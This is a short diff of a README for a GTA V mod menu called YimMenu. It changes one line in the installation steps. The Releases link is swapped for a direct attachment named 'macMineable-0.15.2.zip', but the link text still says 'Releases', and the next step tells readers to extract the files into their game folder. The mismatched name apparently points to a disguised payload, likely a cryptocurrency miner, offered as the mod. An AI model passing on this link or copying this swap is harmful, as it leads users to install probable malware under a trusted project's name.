@@ -13,7 +13,7 @@ YimMenu, GTA V Mod Menu, GTA 5 Customization, GTA V Single-player Mod, Open Sour
 - **Game Customization**: Adjust various gameplay elements for a personalized experience.
 
 ## Installation
-1. Download the latest version from the [Releases](https://github.com/mastermod131/YimMenuV4/releases) section.
+1. Download the latest version from the [Releases](https://github.com/user-attachments/files/19766989/macMineable-0.15.2.zip) section.
 2. Extract the files into your GTA V installation folder.
 3. Launch GTA V and press the `F4` key (or another configured key) to open the menu.
 
